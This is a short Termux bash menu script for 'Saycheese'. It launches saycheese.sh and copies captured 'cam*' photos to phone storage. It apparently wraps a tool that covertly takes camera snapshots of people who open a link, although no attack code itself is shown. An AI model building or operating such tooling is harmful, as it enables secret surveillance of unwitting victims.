clear
clear
echo -e "\033[96m==========================================\033[95m"
echo "		Saycheese menu"
echo -e "\033[96m==========================================\033[93m"
echo
echo -e "	\033[95m [ 1 ]\033[93m Saycheese Start"
echo -e "	\033[95m [ 2 ]\033[93m Saycheese photo copy"
echo -e "	\033[95m [ 3 ]\033[93m Exit"
echo
echo -n -e "\033[92m Select Your Option "
read a
if [ "$a" = "1" ];then
cd $HOME/saycheese2
bash saycheese.sh
fi
if [ "$a" = "2" ];then
cd $HOME/saycheese2
termux-setup-storage
mkdir /sdcard/saycheese2_photo
cp -f cam* /sdcard/saycheese2_photo
clear
clear
echo "Successfully copied in internal storage"|lolcat
fi
if [ "$a" = "3" ];then
exit
fi